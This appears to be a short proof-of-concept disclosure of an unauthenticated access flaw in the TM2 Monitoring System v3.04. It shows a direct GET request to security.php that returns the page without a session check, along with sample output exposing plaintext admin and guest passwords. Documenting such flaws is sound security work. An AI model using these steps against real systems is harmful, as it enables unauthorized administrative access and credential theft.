# Proof of Concept – Authentication Bypass in TM2 Monitoring v3.04

This proof of concept demonstrates an **unauthenticated bypass** of the TM2 Monitoring System's login functionality, allowing full administrative access via direct request manipulation.

---

## Steps to Reproduce

### 1. Access the login page
Open your browser and navigate to:

  http://target-ip/login.php


At this point, authentication is expected — but the system only enforces access control via client-side JavaScript.

---

### 2. Intercept with Burp Suite (or curl)

Using a web proxy (e.g., Burp Suite), send a direct unauthenticated request to:

  GET /security.php HTTP/1.1 </br>
  Host: target-ip


The server responds with the **full contents** of the `security.php` page **without checking session state**.

---

### 3. Extract credentials from the response

Within the HTML response, look for the following form inputs:

```html
<input name="pw_admin" value="P@ssword123" type="text">
<input name="pw_guest" value="GuesP@ss" type="text">
